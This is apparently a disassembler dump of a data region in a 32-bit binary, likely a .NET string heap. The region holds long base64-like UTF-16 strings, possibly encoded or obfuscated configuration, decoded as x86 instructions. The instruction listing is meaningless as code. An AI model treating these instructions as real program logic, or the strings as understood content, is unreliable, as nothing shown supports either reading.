10004128:	00 56 00             	add    %dl,0x0(%esi)
1000412b:	4a                   	dec    %edx
1000412c:	00 57 00             	add    %dl,0x0(%edi)
1000412f:	62 00                	bound  %eax,(%eax)
10004131:	6c                   	insb   (%dx),%es:(%edi)
10004132:	00 42 00             	add    %al,0x0(%edx)
10004135:	6c                   	insb   (%dx),%es:(%edi)
10004136:	00 62 00             	add    %ah,0x0(%edx)
10004139:	33 00                	xor    (%eax),%eax
1000413b:	6c                   	insb   (%dx),%es:(%edi)
1000413c:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
10004140:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
10004144:	00 53 00             	add    %dl,0x0(%ebx)
10004147:	56                   	push   %esi
10004148:	00 6d 00             	add    %ch,0x0(%ebp)
1000414b:	35 00 51 00 5a       	xor    $0x5a005100,%eax
10004150:	00 57 00             	add    %dl,0x0(%edi)
10004153:	31 00                	xor    %eax,(%eax)
10004155:	4f                   	dec    %edi
10004156:	00 62 00             	add    %ah,0x0(%edx)
10004159:	32 00                	xor    (%eax),%al
1000415b:	39 00                	cmp    %eax,(%eax)
1000415d:	35 00 5a 00 55       	xor    $0x55005a00,%eax
10004162:	00 77 00             	add    %dh,0x0(%edi)
10004165:	78 00                	js     0x10004167
10004167:	55                   	push   %ebp
10004168:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
1000416c:	00 75 00             	add    %dh,0x0(%ebp)
1000416f:	55                   	push   %ebp
10004170:	00 47 00             	add    %al,0x0(%edi)
10004173:	55                   	push   %ebp
10004174:	00 3d 00 00 15 6f    	add    %bh,0x6f150000
1000417a:	00 79 00             	add    %bh,0x0(%ecx)
1000417d:	65 00 4c 00 31       	add    %cl,%gs:0x31(%eax,%eax,1)
10004182:	00 52 00             	add    %dl,0x0(%edx)
10004185:	56                   	push   %esi
10004186:	00 6e 00             	add    %ch,0x0(%esi)
10004189:	50                   	push   %eax
1000418a:	00 65 00             	add    %ah,0x0(%ebp)
1000418d:	00 79 65             	add    %bh,0x65(%ecx)
10004190:	00 56 00             	add    %dl,0x0(%esi)
10004193:	4a                   	dec    %edx
10004194:	00 72 00             	add    %dh,0x0(%edx)
10004197:	55                   	push   %ebp
10004198:	00 46 00             	add    %al,0x0(%esi)
1000419b:	42                   	inc    %edx
1000419c:	00 59 00             	add    %bl,0x0(%ecx)
1000419f:	55                   	push   %ebp
100041a0:	00 56 00             	add    %dl,0x0(%esi)
100041a3:	63 00                	arpl   %eax,(%eax)
100041a5:	35 00 63 00 56       	xor    $0x56006300,%eax
100041aa:	00 6b 00             	add    %ch,0x0(%ebx)
100041ad:	7a 00                	jp     0x100041af
100041af:	54                   	push   %esp
100041b0:	00 6e 00             	add    %ch,0x0(%esi)
100041b3:	6c                   	insb   (%dx),%es:(%edi)
100041b4:	00 53 00             	add    %dl,0x0(%ebx)
100041b7:	61                   	popa
100041b8:	00 31                	add    %dh,(%ecx)
100041ba:	00 42 00             	add    %al,0x0(%edx)
100041bd:	51                   	push   %ecx
100041be:	00 57 00             	add    %dl,0x0(%edi)
100041c1:	46                   	inc    %esi
100041c2:	00 46 00             	add    %al,0x0(%esi)
100041c5:	58                   	pop    %eax
100041c6:	00 4f 00             	add    %cl,0x0(%edi)
100041c9:	58                   	pop    %eax
100041ca:	00 46 00             	add    %al,0x0(%esi)
100041cd:	35 00 55 00 6d       	xor    $0x6d005500,%eax
100041d2:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
100041d6:	00 55 00             	add    %dl,0x0(%ebp)
100041d9:	46                   	inc    %esi
100041da:	00 68 00             	add    %ch,0x0(%eax)
100041dd:	52                   	push   %edx
100041de:	00 56 00             	add    %dl,0x0(%esi)
100041e1:	7a 00                	jp     0x100041e3
100041e3:	6c                   	insb   (%dx),%es:(%edi)
100041e4:	00 78 00             	add    %bh,0x0(%eax)
100041e7:	61                   	popa
100041e8:	00 6e 00             	add    %ch,0x0(%esi)
100041eb:	6c                   	insb   (%dx),%es:(%edi)
100041ec:	00 53 00             	add    %dl,0x0(%ebx)
100041ef:	61                   	popa
100041f0:	00 31                	add    %dh,(%ecx)
100041f2:	00 42 00             	add    %al,0x0(%edx)
100041f5:	51                   	push   %ecx
100041f6:	00 57 00             	add    %dl,0x0(%edi)
100041f9:	46                   	inc    %esi
100041fa:	00 46 00             	add    %al,0x0(%esi)
100041fd:	58                   	pop    %eax
100041fe:	00 4f 00             	add    %cl,0x0(%edi)
10004201:	58                   	pop    %eax
10004202:	00 45 00             	add    %al,0x0(%ebp)
10004205:	3d 00 00 15 79       	cmp    $0x79150000,%eax
1000420a:	00 52 00             	add    %dl,0x0(%edx)
1000420d:	6b 00 50             	imul   $0x50,(%eax),%eax
10004210:	00 50 00             	add    %dl,0x0(%eax)
10004213:	58                   	pop    %eax
10004214:	00 51 00             	add    %dl,0x0(%ecx)
10004217:	57                   	push   %edi
10004218:	00 39                	add    %bh,(%ecx)
1000421a:	00 71 00             	add    %dh,0x0(%ecx)
1000421d:	00 81 71 4e 00 6c    	add    %al,0x6c004e71(%ecx)
10004223:	00 4e 00             	add    %cl,0x0(%esi)
10004226:	6d                   	insl   (%dx),%es:(%edi)
10004227:	00 55 00             	add    %dl,0x0(%ebp)
1000422a:	6a 00                	push   $0x0
1000422c:	4e                   	dec    %esi
1000422d:	00 32                	add    %dh,(%edx)
1000422f:	00 56 00             	add    %dl,0x0(%esi)
10004232:	45                   	inc    %ebp
10004233:	00 68 00             	add    %ch,0x0(%eax)
10004236:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10004239:	00 31                	add    %dh,(%ecx)
1000423b:	00 4e 00             	add    %cl,0x0(%esi)
1000423e:	58                   	pop    %eax
1000423f:	00 4e 00             	add    %cl,0x0(%esi)
10004242:	54                   	push   %esp
10004243:	00 5a 00             	add    %bl,0x0(%edx)
10004246:	54                   	push   %esp
10004247:	00 5a 00             	add    %bl,0x0(%edx)
1000424a:	6c                   	insb   (%dx),%es:(%edi)
1000424b:	00 49 00             	add    %cl,0x0(%ecx)
1000424e:	7a 00                	jp     0x10004250
10004250:	64 00 6c 00 52       	add    %ch,%fs:0x52(%eax,%eax,1)
10004255:	00 49 00             	add    %cl,0x0(%ecx)
10004258:	5a                   	pop    %edx
10004259:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
1000425d:	00 32                	add    %dh,(%edx)
1000425f:	00 55 00             	add    %dl,0x0(%ebp)
10004262:	32 00                	xor    (%eax),%al
10004264:	5a                   	pop    %edx
10004265:	00 53 00             	add    %dl,0x0(%ebx)
10004268:	4d                   	dec    %ebp
10004269:	00 33                	add    %dh,(%ebx)
1000426b:	00 5a 00             	add    %bl,0x0(%edx)
1000426e:	55                   	push   %ebp
1000426f:	00 53 00             	add    %dl,0x0(%ebx)
10004272:	47                   	inc    %edi
10004273:	00 51 00             	add    %dl,0x0(%ecx)
10004276:	33 00                	xor    (%eax),%eax
10004278:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
1000427c:	52                   	push   %edx
1000427d:	00 48 00             	add    %cl,0x0(%eax)
10004280:	4e                   	dec    %esi
10004281:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
10004285:	00 6d 00             	add    %ch,0x0(%ebp)
10004288:	55                   	push   %ebp
10004289:	00 6a 00             	add    %ch,0x0(%edx)
1000428c:	4e                   	dec    %esi
1000428d:	00 32                	add    %dh,(%edx)
1000428f:	00 56 00             	add    %dl,0x0(%esi)
10004292:	45                   	inc    %ebp
10004293:	00 68 00             	add    %ch,0x0(%eax)
10004296:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10004299:	00 7a 00             	add    %bh,0x0(%edx)
1000429c:	5a                   	pop    %edx
1000429d:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
100042a1:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
100042a5:	00 7a 00             	add    %bh,0x0(%edx)
100042a8:	64 00 6c 00 52       	add    %ch,%fs:0x52(%eax,%eax,1)
100042ad:	00 49 00             	add    %cl,0x0(%ecx)
100042b0:	5a                   	pop    %edx
100042b1:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
100042b5:	00 47 00             	add    %al,0x0(%edi)
100042b8:	63 00                	arpl   %eax,(%eax)
100042ba:	32 00                	xor    (%eax),%al
100042bc:	49                   	dec    %ecx
100042bd:	00 32                	add    %dh,(%edx)
100042bf:	00 55 00             	add    %dl,0x0(%ebp)
100042c2:	32 00                	xor    (%eax),%al
100042c4:	5a                   	pop    %edx
100042c5:	00 53 00             	add    %dl,0x0(%ebx)
100042c8:	4d                   	dec    %ebp
100042c9:	00 33                	add    %dh,(%ebx)
100042cb:	00 5a 00             	add    %bl,0x0(%edx)
100042ce:	55                   	push   %ebp
100042cf:	00 53 00             	add    %dl,0x0(%ebx)
100042d2:	47                   	inc    %edi
100042d3:	00 51 00             	add    %dl,0x0(%ecx)
100042d6:	33 00                	xor    (%eax),%eax
100042d8:	4e                   	dec    %esi
100042d9:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
100042dd:	00 6d 00             	add    %ch,0x0(%ebp)
100042e0:	55                   	push   %ebp
100042e1:	00 6a 00             	add    %ch,0x0(%edx)
100042e4:	4e                   	dec    %esi
100042e5:	00 32                	add    %dh,(%edx)
100042e7:	00 56 00             	add    %dl,0x0(%esi)
100042ea:	45                   	inc    %ebp
100042eb:	00 68 00             	add    %ch,0x0(%eax)
100042ee:	6b 00 4e             	imul   $0x4e,(%eax),%eax
100042f1:	00 30                	add    %dh,(%eax)
100042f3:	00 5a 00             	add    %bl,0x0(%edx)
100042f6:	57                   	push   %edi
100042f7:	00 4d 00             	add    %cl,0x0(%ebp)
100042fa:	44                   	inc    %esp
100042fb:	00 5a 00             	add    %bl,0x0(%edx)
100042fe:	54                   	push   %esp
100042ff:	00 5a 00             	add    %bl,0x0(%edx)
10004302:	6c                   	insb   (%dx),%es:(%edi)
10004303:	00 49 00             	add    %cl,0x0(%ecx)
10004306:	7a 00                	jp     0x10004308
10004308:	64 00 6c 00 52       	add    %ch,%fs:0x52(%eax,%eax,1)
1000430d:	00 49 00             	add    %cl,0x0(%ecx)
10004310:	5a                   	pop    %edx
10004311:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
10004315:	00 32                	add    %dh,(%edx)
10004317:	00 55 00             	add    %dl,0x0(%ebp)
1000431a:	32 00                	xor    (%eax),%al
1000431c:	5a                   	pop    %edx
1000431d:	00 53 00             	add    %dl,0x0(%ebx)
10004320:	4d                   	dec    %ebp
10004321:	00 33                	add    %dh,(%ebx)
10004323:	00 5a 00             	add    %bl,0x0(%edx)
10004326:	55                   	push   %ebp
10004327:	00 53 00             	add    %dl,0x0(%ebx)
1000432a:	47                   	inc    %edi
1000432b:	00 51 00             	add    %dl,0x0(%ecx)
1000432e:	33 00                	xor    (%eax),%eax
10004330:	59                   	pop    %ecx
10004331:	00 56 00             	add    %dl,0x0(%esi)
10004334:	64 00 33             	add    %dh,%fs:(%ebx)
10004337:	00 4e 00             	add    %cl,0x0(%esi)
1000433a:	6c                   	insb   (%dx),%es:(%edi)
1000433b:	00 4e 00             	add    %cl,0x0(%esi)
1000433e:	6d                   	insl   (%dx),%es:(%edi)
1000433f:	00 55 00             	add    %dl,0x0(%ebp)
10004342:	6a 00                	push   $0x0
10004344:	4e                   	dec    %esi
10004345:	00 32                	add    %dh,(%edx)
10004347:	00 56 00             	add    %dl,0x0(%esi)
1000434a:	45                   	inc    %ebp
1000434b:	00 68 00             	add    %ch,0x0(%eax)
1000434e:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10004351:	00 7a 00             	add    %bh,0x0(%edx)
10004354:	5a                   	pop    %edx
10004355:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
10004359:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
1000435d:	00 7a 00             	add    %bh,0x0(%edx)
10004360:	64 00 6c 00 52       	add    %ch,%fs:0x52(%eax,%eax,1)
10004365:	00 49 00             	add    %cl,0x0(%ecx)
10004368:	5a                   	pop    %edx
10004369:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
1000436d:	00 39                	add    %bh,(%ecx)
1000436f:	00 4e 00             	add    %cl,0x0(%esi)
10004372:	6c                   	insb   (%dx),%es:(%edi)
10004373:	00 4e 00             	add    %cl,0x0(%esi)
10004376:	6d                   	insl   (%dx),%es:(%edi)
10004377:	00 55 00             	add    %dl,0x0(%ebp)
1000437a:	6a 00                	push   $0x0
1000437c:	4e                   	dec    %esi
1000437d:	00 32                	add    %dh,(%edx)
1000437f:	00 56 00             	add    %dl,0x0(%esi)
10004382:	45                   	inc    %ebp
10004383:	00 68 00             	add    %ch,0x0(%eax)
10004386:	6b 00 4e             	imul   $0x4e,(%eax),%eax
10004389:	00 77 00             	add    %dh,0x0(%edi)
1000438c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004391:	15 36 00 53 00       	adc    $0x530036,%eax
10004396:	66 00 52 00          	data16 add %dl,0x0(%edx)
1000439a:	33 00                	xor    (%eax),%eax
1000439c:	76 00                	jbe    0x1000439e
1000439e:	54                   	push   %esp
1000439f:	00 48 00             	add    %cl,0x0(%eax)
100043a2:	64 00 37             	add    %dh,%fs:(%edi)
100043a5:	00 00                	add    %al,(%eax)
100043a7:	80 f9 59             	cmp    $0x59,%cl
100043aa:	00 30                	add    %dh,(%eax)
100043ac:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
100043b0:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
100043b4:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
100043b8:	00 62 00             	add    %ah,0x0(%edx)
100043bb:	44                   	inc    %esp
100043bc:	00 52 00             	add    %dl,0x0(%edx)
100043bf:	76 00                	jbe    0x100043c1
100043c1:	54                   	push   %esp
100043c2:	00 47 00             	add    %al,0x0(%edi)
100043c5:	4a                   	dec    %edx
100043c6:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
100043ca:	00 47 00             	add    %al,0x0(%edi)
100043cd:	4e                   	dec    %esi
100043ce:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
100043d2:	00 58 00             	add    %bl,0x0(%eax)
100043d5:	56                   	push   %esi
100043d6:	00 48 00             	add    %cl,0x0(%eax)
100043d9:	63 00                	arpl   %eax,(%eax)
100043db:	47                   	inc    %edi
100043dc:	00 77 00             	add    %dh,0x0(%edi)
100043df:	30 00                	xor    %al,(%eax)
100043e1:	62 00                	bound  %eax,(%eax)
100043e3:	30 00                	xor    %al,(%eax)
100043e5:	78 00                	js     0x100043e7
100043e7:	6a 00                	push   $0x0
100043e9:	53                   	push   %ebx
100043ea:	00 33                	add    %dh,(%ebx)
100043ec:	00 56 00             	add    %dl,0x0(%esi)
100043ef:	31 00                	xor    %eax,(%eax)
100043f1:	52                   	push   %edx
100043f2:	00 33                	add    %dh,(%ebx)
100043f4:	00 42 00             	add    %al,0x0(%edx)
100043f7:	73 00                	jae    0x100043f9
100043f9:	4e                   	dec    %esi
100043fa:	00 47 00             	add    %al,0x0(%edi)
100043fd:	39 00                	cmp    %eax,(%eax)
100043ff:	4d                   	dec    %ebp
10004400:	00 62 00             	add    %ah,0x0(%edx)
10004403:	47                   	inc    %edi
10004404:	00 4a 00             	add    %cl,0x0(%edx)
10004407:	75 00                	jne    0x10004409
10004409:	59                   	pop    %ecx
1000440a:	00 30                	add    %dh,(%eax)
1000440c:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
10004410:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
10004414:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
10004418:	00 62 00             	add    %ah,0x0(%edx)
1000441b:	44                   	inc    %esp
1000441c:	00 52 00             	add    %dl,0x0(%edx)
1000441f:	76 00                	jbe    0x10004421
10004421:	54                   	push   %esp
10004422:	00 47 00             	add    %al,0x0(%edi)
10004425:	4e                   	dec    %esi
10004426:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
1000442a:	00 58 00             	add    %bl,0x0(%eax)
1000442d:	56                   	push   %esi
1000442e:	00 48 00             	add    %cl,0x0(%eax)
10004431:	63 00                	arpl   %eax,(%eax)
10004433:	47                   	inc    %edi
10004434:	00 77 00             	add    %dh,0x0(%edi)
10004437:	30 00                	xor    %al,(%eax)
10004439:	62 00                	bound  %eax,(%eax)
1000443b:	30 00                	xor    %al,(%eax)
1000443d:	78 00                	js     0x1000443f
1000443f:	53                   	push   %ebx
10004440:	00 61 00             	add    %ah,0x0(%ecx)
10004443:	47                   	inc    %edi
10004444:	00 4e 00             	add    %cl,0x0(%esi)
10004447:	6a 00                	push   $0x0
10004449:	53                   	push   %ebx
1000444a:	00 33                	add    %dh,(%ebx)
1000444c:	00 56 00             	add    %dl,0x0(%esi)
1000444f:	31 00                	xor    %eax,(%eax)
10004451:	52                   	push   %edx
10004452:	00 33                	add    %dh,(%ebx)
10004454:	00 42 00             	add    %al,0x0(%edx)
10004457:	73 00                	jae    0x10004459
10004459:	4e                   	dec    %esi
1000445a:	00 47 00             	add    %al,0x0(%edi)
1000445d:	39 00                	cmp    %eax,(%eax)
1000445f:	4d                   	dec    %ebp
10004460:	00 59 00             	add    %bl,0x0(%ecx)
10004463:	30 00                	xor    %al,(%eax)
10004465:	74 00                	je     0x10004467
10004467:	31 00                	xor    %eax,(%eax)
10004469:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
1000446d:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
10004471:	62 00                	bound  %eax,(%eax)
10004473:	44                   	inc    %esp
10004474:	00 52 00             	add    %dl,0x0(%edx)
10004477:	76 00                	jbe    0x10004479
10004479:	54                   	push   %esp
1000447a:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
1000447e:	00 7a 00             	add    %bh,0x0(%edx)
10004481:	50                   	push   %eax
10004482:	00 57 00             	add    %dl,0x0(%edi)
10004485:	4e                   	dec    %esi
10004486:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
1000448a:	00 58 00             	add    %bl,0x0(%eax)
1000448d:	56                   	push   %esi
1000448e:	00 48 00             	add    %cl,0x0(%eax)
10004491:	63 00                	arpl   %eax,(%eax)
10004493:	47                   	inc    %edi
10004494:	00 77 00             	add    %dh,0x0(%edi)
10004497:	30 00                	xor    %al,(%eax)
10004499:	62 00                	bound  %eax,(%eax)
1000449b:	30 00                	xor    %al,(%eax)
1000449d:	77 00                	ja     0x1000449f
1000449f:	3d 00 00 15 63       	cmp    $0x63150000,%eax
100044a4:	00 4b 00             	add    %cl,0x0(%ebx)
100044a7:	75 00                	jne    0x100044a9
100044a9:	75 00                	jne    0x100044ab
100044ab:	47                   	inc    %edi
100044ac:	00 70 00             	add    %dh,0x0(%eax)
100044af:	6c                   	insb   (%dx),%es:(%edi)
100044b0:	00 34 00             	add    %dh,(%eax,%eax,1)
100044b3:	6f                   	outsl  %ds:(%esi),(%dx)
100044b4:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
100044b8:	85 81 64 00 33 00    	test   %eax,0x330064(%ecx)
100044be:	70 00                	jo     0x100044c0
100044c0:	4d                   	dec    %ebp
100044c1:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
100044c5:	00 5a 00             	add    %bl,0x0(%edx)
100044c8:	6c                   	insb   (%dx),%es:(%edi)
100044c9:	00 4d 00             	add    %cl,0x0(%ebp)
100044cc:	46                   	inc    %esi
100044cd:	00 52 00             	add    %dl,0x0(%edx)
100044d0:	49                   	dec    %ecx
100044d1:	00 62 00             	add    %ah,0x0(%edx)
100044d4:	46                   	inc    %esi
100044d5:	00 46 00             	add    %al,0x0(%esi)
100044d8:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
100044dc:	48                   	dec    %eax
100044dd:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
100044e1:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100044e5:	00 56 00             	add    %dl,0x0(%esi)
100044e8:	32 00                	xor    (%eax),%al
100044ea:	5a                   	pop    %edx
100044eb:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100044ef:	00 55 00             	add    %dl,0x0(%ebp)
100044f2:	53                   	push   %ebx
100044f3:	00 47 00             	add    %al,0x0(%edi)
100044f6:	78 00                	js     0x100044f8
100044f8:	33 00                	xor    (%eax),%eax
100044fa:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100044fe:	78 00                	js     0x10004500
10004500:	31 00                	xor    %eax,(%eax)
10004502:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004506:	55                   	push   %ebp
10004507:	00 77 00             	add    %dh,0x0(%edi)
1000450a:	56                   	push   %esi
1000450b:	00 45 00             	add    %al,0x0(%ebp)
1000450e:	68 00 73 00 59       	push   $0x59007300
10004513:	00 31                	add    %dh,(%ecx)
10004515:	00 68 00             	add    %ch,0x0(%eax)
10004518:	47                   	inc    %edi
10004519:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
1000451d:	00 70 00             	add    %dh,0x0(%eax)
10004520:	4d                   	dec    %ebp
10004521:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004525:	00 5a 00             	add    %bl,0x0(%edx)
10004528:	6c                   	insb   (%dx),%es:(%edi)
10004529:	00 4d 00             	add    %cl,0x0(%ebp)
1000452c:	46                   	inc    %esi
1000452d:	00 52 00             	add    %dl,0x0(%edx)
10004530:	49                   	dec    %ecx
10004531:	00 62 00             	add    %ah,0x0(%edx)
10004534:	48                   	dec    %eax
10004535:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
10004539:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000453d:	00 56 00             	add    %dl,0x0(%esi)
10004540:	32 00                	xor    (%eax),%al
10004542:	5a                   	pop    %edx
10004543:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
10004547:	00 55 00             	add    %dl,0x0(%ebp)
1000454a:	53                   	push   %ebx
1000454b:	00 47 00             	add    %al,0x0(%edi)
1000454e:	78 00                	js     0x10004550
10004550:	6b 00 63             	imul   $0x63,(%eax),%eax
10004553:	00 47 00             	add    %al,0x0(%edi)
10004556:	4a                   	dec    %edx
10004557:	00 33                	add    %dh,(%ebx)
10004559:	00 65 00             	add    %ah,0x0(%ebp)
1000455c:	6b 00 78             	imul   $0x78,(%eax),%eax
1000455f:	00 31                	add    %dh,(%ecx)
10004561:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004565:	00 55 00             	add    %dl,0x0(%ebp)
10004568:	77 00                	ja     0x1000456a
1000456a:	56                   	push   %esi
1000456b:	00 45 00             	add    %al,0x0(%ebp)
1000456e:	68 00 73 00 64       	push   $0x64007300
10004573:	00 33                	add    %dh,(%ebx)
10004575:	00 70 00             	add    %dh,0x0(%eax)
10004578:	4d                   	dec    %ebp
10004579:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
1000457d:	00 5a 00             	add    %bl,0x0(%edx)
10004580:	6c                   	insb   (%dx),%es:(%edi)
10004581:	00 4d 00             	add    %cl,0x0(%ebp)
10004584:	46                   	inc    %esi
10004585:	00 52 00             	add    %dl,0x0(%edx)
10004588:	49                   	dec    %ecx
10004589:	00 62 00             	add    %ah,0x0(%edx)
1000458c:	47                   	inc    %edi
1000458d:	00 31                	add    %dh,(%ecx)
1000458f:	00 53 00             	add    %dl,0x0(%ebx)
10004592:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10004596:	64 00 36             	add    %dh,%fs:(%esi)
10004599:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
1000459d:	00 56 00             	add    %dl,0x0(%esi)
100045a0:	32 00                	xor    (%eax),%al
100045a2:	5a                   	pop    %edx
100045a3:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100045a7:	00 55 00             	add    %dl,0x0(%ebp)
100045aa:	53                   	push   %ebx
100045ab:	00 47 00             	add    %al,0x0(%edi)
100045ae:	78 00                	js     0x100045b0
100045b0:	33 00                	xor    (%eax),%eax
100045b2:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100045b6:	78 00                	js     0x100045b8
100045b8:	31 00                	xor    %eax,(%eax)
100045ba:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100045be:	55                   	push   %ebp
100045bf:	00 77 00             	add    %dh,0x0(%edi)
100045c2:	56                   	push   %esi
100045c3:	00 45 00             	add    %al,0x0(%ebp)
100045c6:	68 00 73 00 5a       	push   $0x5a007300
100045cb:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
100045cf:	00 4f 00             	add    %cl,0x0(%edi)
100045d2:	64 00 33             	add    %dh,%fs:(%ebx)
100045d5:	00 70 00             	add    %dh,0x0(%eax)
100045d8:	4d                   	dec    %ebp
100045d9:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
100045dd:	00 5a 00             	add    %bl,0x0(%edx)
100045e0:	6c                   	insb   (%dx),%es:(%edi)
100045e1:	00 4d 00             	add    %cl,0x0(%ebp)
100045e4:	46                   	inc    %esi
100045e5:	00 52 00             	add    %dl,0x0(%edx)
100045e8:	49                   	dec    %ecx
100045e9:	00 62 00             	add    %ah,0x0(%edx)
100045ec:	48                   	dec    %eax
100045ed:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
100045f1:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100045f5:	00 56 00             	add    %dl,0x0(%esi)
100045f8:	32 00                	xor    (%eax),%al
100045fa:	5a                   	pop    %edx
100045fb:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100045ff:	00 55 00             	add    %dl,0x0(%ebp)
10004602:	53                   	push   %ebx
10004603:	00 47 00             	add    %al,0x0(%edi)
10004606:	78 00                	js     0x10004608
10004608:	6a 00                	push   $0x0
1000460a:	57                   	push   %edi
1000460b:	00 45 00             	add    %al,0x0(%ebp)
1000460e:	56                   	push   %esi
1000460f:	00 33                	add    %dh,(%ebx)
10004611:	00 65 00             	add    %ah,0x0(%ebp)
10004614:	6b 00 78             	imul   $0x78,(%eax),%eax
10004617:	00 31                	add    %dh,(%ecx)
10004619:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
1000461d:	00 55 00             	add    %dl,0x0(%ebp)
10004620:	77 00                	ja     0x10004622
10004622:	56                   	push   %esi
10004623:	00 45 00             	add    %al,0x0(%ebp)
10004626:	68 00 73 00 64       	push   $0x64007300
1000462b:	00 33                	add    %dh,(%ebx)
1000462d:	00 70 00             	add    %dh,0x0(%eax)
10004630:	4d                   	dec    %ebp
10004631:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004635:	00 5a 00             	add    %bl,0x0(%edx)
10004638:	6c                   	insb   (%dx),%es:(%edi)
10004639:	00 4d 00             	add    %cl,0x0(%ebp)
1000463c:	46                   	inc    %esi
1000463d:	00 52 00             	add    %dl,0x0(%edx)
10004640:	49                   	dec    %ecx
10004641:	00 62 00             	add    %ah,0x0(%edx)
10004644:	44                   	inc    %esp
10004645:	00 46 00             	add    %al,0x0(%esi)
10004648:	77 00                	ja     0x1000464a
1000464a:	57                   	push   %edi
1000464b:	00 58 00             	add    %bl,0x0(%eax)
1000464e:	64 00 36             	add    %dh,%fs:(%esi)
10004651:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
10004655:	00 56 00             	add    %dl,0x0(%esi)
10004658:	32 00                	xor    (%eax),%al
1000465a:	5a                   	pop    %edx
1000465b:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
1000465f:	00 55 00             	add    %dl,0x0(%ebp)
10004662:	53                   	push   %ebx
10004663:	00 47 00             	add    %al,0x0(%edi)
10004666:	78 00                	js     0x10004668
10004668:	33 00                	xor    (%eax),%eax
1000466a:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
1000466e:	78 00                	js     0x10004670
10004670:	31 00                	xor    %eax,(%eax)
10004672:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
10004676:	55                   	push   %ebp
10004677:	00 77 00             	add    %dh,0x0(%edi)
1000467a:	56                   	push   %esi
1000467b:	00 45 00             	add    %al,0x0(%ebp)
1000467e:	68 00 73 00 4d       	push   $0x4d007300
10004683:	00 30                	add    %dh,(%eax)
10004685:	00 70 00             	add    %dh,0x0(%eax)
10004688:	32 00                	xor    (%eax),%al
1000468a:	64 00 33             	add    %dh,%fs:(%ebx)
1000468d:	00 70 00             	add    %dh,0x0(%eax)
10004690:	4d                   	dec    %ebp
10004691:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
10004695:	00 5a 00             	add    %bl,0x0(%edx)
10004698:	6c                   	insb   (%dx),%es:(%edi)
10004699:	00 4d 00             	add    %cl,0x0(%ebp)
1000469c:	46                   	inc    %esi
1000469d:	00 52 00             	add    %dl,0x0(%edx)
100046a0:	49                   	dec    %ecx
100046a1:	00 62 00             	add    %ah,0x0(%edx)
100046a4:	48                   	dec    %eax
100046a5:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
100046a9:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
100046ad:	00 56 00             	add    %dl,0x0(%esi)
100046b0:	32 00                	xor    (%eax),%al
100046b2:	5a                   	pop    %edx
100046b3:	00 54 00 42          	add    %dl,0x42(%eax,%eax,1)
100046b7:	00 55 00             	add    %dl,0x0(%ebp)
100046ba:	53                   	push   %ebx
100046bb:	00 47 00             	add    %al,0x0(%edi)
100046be:	78 00                	js     0x100046c0
100046c0:	6a 00                	push   $0x0
100046c2:	4d                   	dec    %ebp
100046c3:	00 6a 00             	add    %ch,0x0(%edx)
100046c6:	6c                   	insb   (%dx),%es:(%edi)
